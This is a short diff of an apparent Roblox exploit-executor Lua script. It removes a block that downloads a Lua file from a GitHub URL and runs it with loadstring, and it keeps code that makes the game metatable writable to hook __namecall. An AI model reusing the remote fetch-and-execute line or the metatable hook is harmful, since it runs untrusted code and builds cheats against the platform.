@@ -1,8 +1,3 @@
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/hermanos-dev/hermanos-script/main/middle.lua'))()
-    end)
-end)
 local mt = getrawmetatable(game)
 setreadonly(mt,false)
 local old = mt.__namecall
